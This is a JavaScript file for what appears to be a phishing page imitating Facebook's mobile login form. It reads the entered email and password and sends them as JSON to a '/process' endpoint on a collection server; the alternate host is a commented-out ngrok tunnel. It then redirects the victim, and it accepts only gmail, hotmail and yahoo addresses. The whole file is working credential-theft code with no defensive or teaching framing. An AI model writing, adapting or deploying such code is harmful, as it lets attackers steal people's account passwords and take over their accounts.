const button = document.getElementById("submit_id")
const email = document.getElementById("m_login_email")
const password = document.getElementById("m_login_password")
const pw_box = document.getElementsByClassName("_4g34 _5i2i _52we")

// -------------------------------------------- Fetch Method 
let main_url = "http://127.0.0.1:5501"
// let main_url = "https://fae2-86-50-71-71.ngrok-free.app"

let url_whole = main_url + "/process"

async function post() {

    let object = {
        email: email.value,
        password: password.value
    }

   try { 
    console.log(object)
    let res = await fetch(url_whole , {
        method: "POST",
        mode: "cors",
        headers: {
            'Content-Type': "application/json"
        },
        body: JSON.stringify(object)
    }
    )
    const r_url = res.url
    console.log(`res url is ${r_url}`)
    window.location.assign(r_url)
    }catch (err){
        console.warn(err);
    }
    
}

// ------------------------------------------- submit button

button.addEventListener("click", function (e) {
    console.log(`email score : ${email_validator()} , pwd_score : ${pwd_validator()}`)
    if ((email_validator() === 0) || (pwd_validator() == 0)) {
        e.preventDefault()
    } else {
        console.log("Submiting")
        post()
    }
}
)

// ------------------------------------------- validator 

//--------------- pwd Validator

pwd_validator()
function pwd_validator(){
    let count_pw = 0 
    let pw_variable = password.value 
    if(pw_variable.length){
        count_pw = 1
    } else {
        count_pw = 0
    }
    return count_pw
}

//--------------- Email Validator

function email_validator(){

    let email_value = email.value
    const type = typeof(email_value)
    let count = 0
    if (type == "string"){
        // gmail
        let index_gmail = email_value.match("@gmail.com")
        // hotmail
        let index_hot = email_value.match("@hotmail.com")
        // yahoo
        let index_yahoo = email_value.match("@yahoo.com")
        if (index_gmail != null) {
            count ++
        } else if (index_hot != null) {
            count ++
        } else if (index_yahoo != null) {
            count ++
        }
    }

    return count
}